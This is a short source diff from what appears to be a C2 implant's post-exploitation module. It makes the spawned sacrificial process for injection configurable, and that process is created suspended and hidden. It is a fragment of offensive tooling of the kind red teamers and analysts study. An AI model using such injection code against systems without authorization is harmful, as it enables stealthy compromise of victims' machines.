@@ -813,7 +813,7 @@ auto DECLFN Task::PostEx(
         if(ForkCategory == KH_INJECT_SPAWN){
             Self->Config.Ps.Pipe = FALSE;
     
-            if ( ! Self->Ps->Create( "C:\\windows\\system32\\cmd.exe", TRUE, CREATE_SUSPENDED | CREATE_NO_WINDOW, &PsInfo ) ) {
+            if ( ! Self->Ps->Create( Self->Config.Postex.Spawnto, TRUE, CREATE_SUSPENDED | CREATE_NO_WINDOW, &PsInfo ) ) {
                 QuickErr( "Failed in process creation: %d", KhGetError );
                 return CleanupAndReturn( KhGetError );
             }
